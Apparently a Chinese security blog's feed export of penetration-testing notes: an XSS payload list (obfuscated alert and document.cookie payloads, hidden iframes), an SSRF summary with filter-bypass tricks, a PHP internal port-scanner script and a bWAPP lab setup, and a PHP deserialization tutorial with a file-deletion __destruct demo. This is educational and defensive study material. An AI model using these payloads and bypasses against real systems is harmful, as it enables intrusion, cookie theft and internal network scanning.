href=&quot;data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;test&lt;/a&gt; //无反应 但在地址栏中输入base64会弹框会弹窗</span><br><span class="line">&lt;a href=&quot;&quot; onclick=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;aaaaa&lt;/a&gt; //可以去掉双引号</span><br><span class="line">&lt;a href=&quot;&quot; onclick=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;aaaaa&lt;/a&gt; </span><br><span class="line">&lt;a href=&quot;&quot; onclick=eval(&apos;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&apos;)&gt;aaaaa&lt;/a&gt; </span><br><span class="line"></span><br><span class="line">input标签下</span><br><span class="line">&lt;input value=&quot;&quot; onclick=&quot;alert(document.cookie)&quot; type=&quot;text&quot;&gt; //点击输入框时触发</span><br><span class="line">&lt;INPUT name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;name&quot; onmouseover=prompt(document.cookie) style=&quot;width:100%;height:100%;&quot;&gt; </span><br><span class="line"></span><br><span class="line">span标签下</span><br><span class="line">&lt;span id=&quot;span&quot;  recieveurl=&apos;xxxeId=1&apos; accesskey=&apos;X&apos; onclick=&apos;alert(/xss/)&apos; bad=&apos;&apos;&gt;&lt;/span&gt; //alt+shift+x 触发 感觉很鸡肋</span><br><span class="line"></span><br><span class="line">iframe标签下</span><br><span class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;); height=0 width=0 style=&quot;border:0px;&quot;/&gt;&lt;iframe&gt; //设置好css可以完美隐藏</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot; height=0 width=0 style=&quot;border:0px;&quot;/&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert`1`&amp;lt;/script&amp;gt;&quot; height=0 width=0 style=&quot;border:0px;&quot;/&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;http://www.baidu.com&quot; onmouseover=alert(&apos;xss&apos;) height=100%0 width=100% style=&quot;border:0px;position: absolute;top:0px;left:0px;&quot;/&gt;&lt;iframe&gt; //css使用绝对定位覆盖全部撑开</span><br><span class="line">&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;;&quot; frameborder=&quot;0&quot; width=&quot;100%&quot; height=&quot;1120px&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
        <tag>xss</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF总结</title>
    <url>/2019/12/15/SSRF/</url>
    <content><![CDATA[<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<a id="more"></a>

<h2 id="0x00-概念"><a href="#0x00-概念" class="headerlink" title="0x00 概念"></a>0x00 概念</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<p>注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p>
<h2 id="0x01-可能出现的地方"><a href="#0x01-可能出现的地方" class="headerlink" title="0x01 可能出现的地方"></a>0x01 可能出现的地方</h2><p>1.社交分享功能：获取超链接的标题等内容进行显示</p>
<p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
<p>3.在线翻译：给网址翻译对应网页的内容</p>
<p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
<p>5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
<p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
<p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
<p>8.数据库内置功能：数据库的比如<code>mongodb</code>的<code>copyDatabase</code>函数</p>
<p>9.邮件系统：比如接收邮件服务器地址</p>
<p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
<p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
<p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>
<p>12.从远程服务器请求资源（upload from url 如discuz!;  import &amp; expost rss feed 如web blog;  使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p>
<p>13.WebHooks：寻找触发特定事件时发出http请求的服务。在大多数WebHooks的功能中，终端用户可以选择他们的终端点和主机名。尝试向内部服务发送http请求。</p>
<p>14.PDF生成器：试着注入指向内部服务的<code>&lt;iframe&gt;,&lt;img&gt;,&lt;base&gt;</code>或者<code>&lt;script&gt;</code>元素或者CSS的<code>url()</code>函数。</p>
<p>15.文档解析器：尝试了解文档是如何被解析的。如果是XML文档，那就是用了PDF生成器方法。对于其他文档，检查是否存在引用外部资源的方法然后通过服务器向内部服务发送请求。</p>
<p>16.链接扩展: 最近<a href="https://twitter.com/BugBountyHQ/status/868242771617792000" target="_blank" rel="noopener">Mark Litchfield在推特扩展链接上发现了漏洞</a>，名声大涨。</p>
<p>17.文件上传：与常规上传文件相反，尝试发送url请求然后检查是否下载了url的内容。<a href="https://hackerone.com/reports/713" target="_blank" rel="noopener">例子</a></p>
<h2 id="0x02-漏洞验证"><a href="#0x02-漏洞验证" class="headerlink" title="0x02 漏洞验证"></a>0x02 漏洞验证</h2><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求。</p>
<p>比如：该资源地址类型为 <code>http://www.xxx.com/a.php?image=(地址)</code>的就可能存在SSRF漏洞。</p>
<p>2.dnslog等工具进行测试，看是否被访问。</p>
<ul>
<li>可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</li>
</ul>
<p>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址。</p>
<ul>
<li><p>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p>
</li>
<li><p>通过二级域名暴力猜解工具模糊猜测内网地址。</p>
</li>
</ul>
<p>4.直接返回的Banner、title、content等信息。</p>
<p>5.留意bool型SSRF</p>
<h2 id="0x03-一些利用方式"><a href="#0x03-一些利用方式" class="headerlink" title="0x03 一些利用方式"></a>0x03 一些利用方式</h2><p>1.让服务端去访问相应的网址 比如在自己的服务器上监听端口然后在url让他去请求我们的服务器</p>
<p>2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</p>
<p>3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</p>
<p>4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</p>
<p>5.攻击内网应用程序（利用跨协议通信技术）</p>
<p>6.判断内网主机是否存活：方法是访问看是否有端口开放</p>
<p>某些时候SSRF漏洞可以用作局域网内的端口扫描。这有助于理清内网的基础设施轮廓和并为下一步其他漏洞的利用做铺垫。上述这种情况通常是最简单的blind SSRF了。如果之前的脚本无法建立连接或收不到服务器响应，异常将被抛出。利用这个特征可以识别端口是否开放（连接建立）或关闭（连接失败或超时）。</p>
<h2 id="0x04-绕过小技巧"><a href="#0x04-绕过小技巧" class="headerlink" title="0x04 绕过小技巧"></a>0x04 绕过小技巧</h2><p>1.<a href="http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的" target="_blank" rel="noopener">http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的</a></p>
<p>2.各种IP地址的进制转换</p>
<p>3.URL跳转绕过：<a href="http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/" target="_blank" rel="noopener">http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/</a></p>
<p>4.短网址绕过 <a href="http://t.cn/RwbLKDx" target="_blank" rel="noopener">http://t.cn/RwbLKDx</a></p>
<p>5.xip.io来绕过：<a href="http://192.168.0.1.xip.io/" target="_blank" rel="noopener">http://192.168.0.1.xip.io/</a> == 192.168.0.1 </p>
<p>6.限制了子网段，可以加 :80 端口绕过。<a href="http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80" target="_blank" rel="noopener">http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80</a></p>
<p>7.探测内网域名，或者将自己的域名解析到内网ip</p>
<p>8.例如 <a href="http://10.153.138.81/ts.php" target="_blank" rel="noopener">http://10.153.138.81/ts.php</a> , 修复时容易出现的获取host时以/分割来确定host，</p>
<p>但这样可以用 <a href="http://abc@10.153.138.81/" target="_blank" rel="noopener">http://abc@10.153.138.81/</a> 绕过</p>
<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2><p>1.禁止跳转</p>
<p>2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
<p>3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</p>
<p>4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p>
<p>5.限制请求的端口为http常用的端口，比如 80、443、8080、8090</p>
<p>6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
<h2 id="0x06-漏洞利用中牵涉的小技巧"><a href="#0x06-漏洞利用中牵涉的小技巧" class="headerlink" title="0x06 漏洞利用中牵涉的小技巧"></a>0x06 漏洞利用中牵涉的小技巧</h2><p>crontab -l 显示当前计划任务</p>
<p>crontab -r 清除当前计划任务</p>
<p>端口转发工具 socat</p>
<p>在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行</p>
<p>AddType application/x-httpd-php .jpg<br>……</p>
<p>常用的探测内网地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.0.0.0/8 127.0.0.1/32 172.16.0.0/12 192.168.0.0/16</span><br></pre></td></tr></table></figure>

<p>常用的探测端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21, 22, 23, 25, 53, 80, 110, 443, 1433, 3306, 3389, 8080, 8443</span><br></pre></td></tr></table></figure>

<h2 id="0x07-举一个栗子"><a href="#0x07-举一个栗子" class="headerlink" title="0x07 举一个栗子"></a>0x07 举一个栗子</h2><p>先说一下关于SSRF的<strong>函数</strong></p>
<p>curl造成的SSRF</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function curl($url)&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url);</span><br></pre></td></tr></table></figure>

<p>file_get_contents造成的SSRF</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">echo file_get_contents($url);</span><br></pre></td></tr></table></figure>
<p>fsockopen造成的SSRF</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function Getfile($host, $port, $link)&#123;</span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);</span><br><span class="line">    if(!$fp)&#123;</span><br><span class="line">        echo &quot;$errstr (error number $errno) \n&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $out = &quot;GET $link HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out .= &quot;HOST $host \r\n&quot;;</span><br><span class="line">        $out .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">        $out .= &quot;\r\n&quot;;</span><br><span class="line">        fwrite($fp, $out);</span><br><span class="line">        $content = &apos;&apos;;</span><br><span class="line">        while(!feof($fp))&#123;</span><br><span class="line">            $contents .= fgets($fp, 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line">        return $contents;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们直接使用docker搭建了Bwapp平台做测试 其实本地搭建php就可以</p>
<p>docker使用命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search bwapp</span><br><span class="line">docker pull raesene/bwapp</span><br><span class="line">docker run -d -p 8080:80 raesene/bwapp</span><br></pre></td></tr></table></figure>

<p>这里我们选择文件包含测试 难度选择low 点击GO</p>
<p><img src="/images/SSRF/bwapp2.png" alt="html">    </p>
<p><img src="/images/SSRF/bwapp1.png" alt="html">    </p>
<p>这时候我们可以看到<code>language</code>参数的值是一个文件 这时候我们用内网探测脚本试一试</p>
<p><img src="/images/SSRF/bwapp3.png" alt="html">    </p>
<p>这里放出内网探测的脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"ip"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//list of port numbers to scan</span></span><br><span class="line">    $ports = <span class="keyword">array</span>(<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">110</span>, <span class="number">1433</span>, <span class="number">3306</span>);</span><br><span class="line">    </span><br><span class="line">    $results = <span class="keyword">array</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">foreach</span>($ports <span class="keyword">as</span> $port)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($pf = @fsockopen($_REQUEST[<span class="string">"ip"</span>], $port, $err, $err_string, <span class="number">1</span>))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $results[$port] = <span class="keyword">true</span>;</span><br><span class="line">            fclose($pf);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $results[$port] = <span class="keyword">false</span>;        </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">foreach</span>($results <span class="keyword">as</span> $port=&gt;$val)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $prot = getservbyport($port,<span class="string">"tcp"</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Port $port ($prot): "</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($val)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;span style=\"color:green\"&gt;OK&lt;/span&gt;&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;span style=\"color:red\"&gt;Inaccessible&lt;/span&gt;&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其实这里是有一个坑的 网上的一些教程说是在bwapp里选择ssrf会提供三个脚本 但是我去docker里找了根本没有这个文件夹 然后又去github上找了这个docker的文件 发现也没有emmm 最后在github上搜到了这个脚本 我把链接贴出来<a href="https://github.com/theand-fork/bwapp-code" target="_blank" rel="noopener">Bwapp 的POC</a></p>
<p>Redis getshll留坑 原先写过 找不到了等重新加到后面吧。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
        <tag>php</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>序列化与反序列化</title>
    <url>/2019/12/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>漏洞：通常情况下不影响软件的正常功能，但如果被攻击者利用，有可能驱使软件去执行一些额外的恶意代码，从而引发</p>
<p>内存中的数据对象只有转换成二进制才可以进行数据持久化和网络传输。将数据对象转换成二进制的流程称之为对象的序列化（Serialization）。反之，将二进制流恢复为数据对象的过程称之为反序列化（Deserialization）。序列化需要保留充分的信息以恢复数据对象，但是为了节省存储空间和网络带宽，序列化后的二进制流又要尽可能的小。</p>
<a id="more"></a>

<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="0x00-PHP反序列化原理"><a href="#0x00-PHP反序列化原理" class="headerlink" title="0x00 PHP反序列化原理"></a>0x00 PHP反序列化原理</h2><h3 id="1-PHP序列化与反序列化基础"><a href="#1-PHP序列化与反序列化基础" class="headerlink" title="1.PHP序列化与反序列化基础"></a>1.PHP序列化与反序列化基础</h3><h4 id="1-1-序列化与反序列化"><a href="#1-1-序列化与反序列化" class="headerlink" title="1.1 序列化与反序列化"></a>1.1 序列化与反序列化</h4><p>序列化是将变量转换为可保存或传输字符串的过程。</p>
<p>反序列化就是在适当的时候把这个字符串再转化为原来的变量使用。</p>
<h4 id="1-2PHP序列化与反序列化函数"><a href="#1-2PHP序列化与反序列化函数" class="headerlink" title="1.2PHP序列化与反序列化函数"></a>1.2PHP序列化与反序列化函数</h4><p>Serialize：可以将变量转换为字符串并且在转换中可以保存当前变量的值。</p>
<p>unserialize：可以将Serialize生成的字符串变换回变量。</p>
<p>php进行序列化的目的是保存一个对象方便以后重用。</p>
<h3 id="2-类，变量，方法，对象"><a href="#2-类，变量，方法，对象" class="headerlink" title="2.类，变量，方法，对象"></a>2.类，变量，方法，对象</h3><p>举例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建Person类 </span></span><br><span class="line"><span class="comment">变量为name和age </span></span><br><span class="line"><span class="comment">方法为Information</span></span><br><span class="line"><span class="comment">对象为$per</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' is '</span>.<span class="keyword">$this</span>-&gt;age . <span class="string">'years old .&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	$per = <span class="keyword">new</span> Person();</span><br><span class="line">	$per -&gt; name = <span class="string">'melon'</span>;</span><br><span class="line">	$per -&gt; age = <span class="number">18</span>;</span><br><span class="line">	$per -&gt; Information();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Person1.png" alt="html">    </p>
<h3 id="3-php序列化实例"><a href="#3-php序列化实例" class="headerlink" title="3.php序列化实例"></a>3.php序列化实例</h3><p>serialize()</p>
<p>序列化一个对象将会保存对象的所有变量。但是不会保存对象的方法，只会保存类的名字。</p>
<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建Person类 </span></span><br><span class="line"><span class="comment">变量为name和age </span></span><br><span class="line"><span class="comment">方法为Information</span></span><br><span class="line"><span class="comment">对象为$per</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' is '</span>.<span class="keyword">$this</span>-&gt;age . <span class="string">'years old .&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	$per = <span class="keyword">new</span> Person();</span><br><span class="line">	$per -&gt; name = <span class="string">'melon'</span>;</span><br><span class="line">	$per -&gt; age = <span class="number">18</span>;</span><br><span class="line">	<span class="keyword">echo</span> serialize($per);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Person2.png" alt="html">    </p>
<h3 id="3-php反序列化实例"><a href="#3-php反序列化实例" class="headerlink" title="3.php反序列化实例"></a>3.php反序列化实例</h3><p>unserialize()</p>
<p>unserialize()一个对象，这个对象的类必须已经定义过。</p>
<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建Person类 </span></span><br><span class="line"><span class="comment">变量为name和age </span></span><br><span class="line"><span class="comment">方法为Information</span></span><br><span class="line"><span class="comment">对象为$per</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' is '</span>.<span class="keyword">$this</span>-&gt;age . <span class="string">'years old .&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> unserialize(<span class="string">'O:6:"Person":2:&#123;s:4:"name";s:5:"melon";s:3:"age";i:18;&#125;'</span>);</span><br><span class="line">	$per -&gt; Information();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Person3.png" alt="html">    </p>
<h3 id="4-php魔法函数"><a href="#4-php魔法函数" class="headerlink" title="4.php魔法函数"></a>4.php魔法函数</h3><p>php类中包含了一些魔法函数，这些函数可以在脚本的任何地方不用声明就可以使用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">		php魔法函数 魔法函数可以在脚本的任何地方不用声明就可以使用</span><br><span class="line">		与php（反）   序列化有关的魔法函数   					</span><br><span class="line">		_construct() 当一个对象被创建时调用				   </span><br><span class="line">		__destruct() 当对象被销毁时						 </span><br><span class="line">		__wakeup()	 使用unserialize						 </span><br><span class="line">		__sleep()	 使用serialize时触发</span><br><span class="line">		__toSting()	 把类当作字符串使用时触发</span><br><span class="line">		__get()		用于从不可访问的属性读取数据</span><br><span class="line">		__set()  	用于数据写入不可访问的属性时</span><br><span class="line">		__isset()  	在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">		__unset()	在不可访问的属性上使用unset()时触发</span><br><span class="line">		__invoke()	当脚本尝试将对象调用为函数时触发</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<h3 id="5-魔法函数举一个例子"><a href="#5-魔法函数举一个例子" class="headerlink" title="5.魔法函数举一个例子"></a>5.魔法函数举一个例子</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' is '</span>.<span class="keyword">$this</span>-&gt;age . <span class="string">'years old .&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    在类里创建三个魔法函数测试</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'I am __toString &lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'I am __construct &lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'I am __destruct &lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$per = <span class="keyword">new</span> Person();       <span class="comment">//创建类执行 __construct</span></span><br><span class="line">	$per -&gt; name = <span class="string">'melon'</span>;</span><br><span class="line">	$per -&gt; age =<span class="number">18</span>;</span><br><span class="line">	<span class="keyword">echo</span> $per;				  <span class="comment">//把类当字符串打印 执行__toString 然后类被销毁 执行 __destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Person4.png" alt="html">    </p>
<h3 id="6-反序列化漏洞"><a href="#6-反序列化漏洞" class="headerlink" title="6.反序列化漏洞"></a>6.反序列化漏洞</h3><p>php反序列化漏洞又称对象注入可能会导致注入，远程代码执行等安全问题的发生。</p>
<p>php反序列化漏洞如何产生：如果一个php代码中使用了unserialize函数去调用某一类，该类中会自动执行一些自定义函数的magic method，这些magic method中如果包含了一些危险操作，或者这些magic method会去调用类中其他带有危险操作的函数，如果这些危险操作是我们可控的，那么就可以进行一些危害操作甚至getshell。</p>
<h2 id="0x01-PHP反序列化Demo"><a href="#0x01-PHP反序列化Demo" class="headerlink" title="0x01 PHP反序列化Demo"></a>0x01 PHP反序列化Demo</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//delete.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">delete</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">'error'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;filename.<span class="string">'was deleted &lt;br/&gt;'</span>;</span><br><span class="line">        unlink(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在代码中可以看到，delete类中定义了一个__destruct()函数，该函数中会执行删除文件操作。如果我们想利用该类来执行任意文件删除操作，则需要找一个可控的unserialize()函数。</p>
